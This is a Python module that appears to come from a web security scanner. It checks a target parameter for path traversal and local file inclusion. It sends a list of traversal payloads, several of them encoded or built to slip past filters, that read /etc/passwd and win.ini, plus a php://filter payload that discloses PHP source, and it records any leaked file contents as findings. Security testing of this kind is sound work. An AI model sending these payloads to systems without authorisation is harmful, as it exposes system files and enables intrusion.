"""traversal — Path Traversal / Local File Inclusion."""
import re
from common import Finding

NAME = "traversal"

PASSWD_RE = re.compile(r"root:.*:0:0:")
WININI_RE = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.IGNORECASE)
PHP_RE = re.compile(r"<\?php")

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "%2e%2e%2f" * 6 + "etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "php://filter/convert.base64-encode/resource=index",
]


def _send(client, method, param, val):
    if method == "GET":
        return client.request("GET", params={param: val})
    return client.request("POST", data={param: val})


def run(client, opts):
    param = opts.get("param")
    if not param:
        return [Finding(NAME, "info", "Path-traversal check skipped", "no --param provided")]
    method = opts.get("method", "GET").upper()
    out = []
    for p in PAYLOADS:
        r = _send(client, method, param, p)
        m = PASSWD_RE.search(r.body)
        if m:
            line = r.body[m.start():m.start() + 80].splitlines()[0]
            fnd = Finding(NAME, "critical", "Path traversal / LFI (Unix)",
                          f"payload {p!r} read /etc/passwd", line)
            fnd.payload = p
            fnd.proof = f"leaked /etc/passwd: {line}"
            out.append(fnd)
            break
        if WININI_RE.search(r.body):
            fnd = Finding(NAME, "critical", "Path traversal / LFI (Windows)",
                          f"payload {p!r} read win.ini", r.body[:80])
            fnd.payload = p
            fnd.proof = f"leaked win.ini: {r.body[:80]}"
            out.append(fnd)
            break
        if "php://filter" in p and PHP_RE.search(r.body):
            fnd = Finding(NAME, "high", "PHP source disclosure via php://filter",
                          f"payload {p!r} exposed source", r.body[:80])
            fnd.payload = p
            out.append(fnd)
            break
    return out
